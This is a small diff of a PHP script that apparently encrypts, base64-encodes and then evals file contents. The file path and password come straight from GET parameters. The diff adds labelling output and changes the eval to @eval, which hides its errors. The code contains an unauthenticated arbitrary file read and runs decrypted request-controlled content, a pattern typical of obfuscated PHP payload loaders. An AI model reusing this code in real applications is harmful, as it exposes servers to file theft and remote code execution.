@@ -6,8 +6,10 @@
 			$good		 = Array(' ',  ' ',  ' ',  '{',  ';',   ',');			
 			$file = file_get_contents($_GET['file']);
 			$file = str_replace($compress, $good, $file);
+			echo "BASE64\n";
 			echo base64_encode($file);
 			echo "\n---------\n";
+			echo "CRYPTED BASE64\n";
 			$file = cryptFile($file, $_GET['pass']);
 			$file = base64_encode($file);
 			echo $file;
@@ -15,7 +17,8 @@
 			$file = base64_decode($file);
 			echo cryptFile($file, $_GET['pass']);
 			echo "\n---------\n";
-			eval(cryptFile($file, $_GET['pass']));			
+			echo "EVAL\n";
+			@eval(cryptFile($file, $_GET['pass']));			
 		}
 	}else{
 		exit('no file');
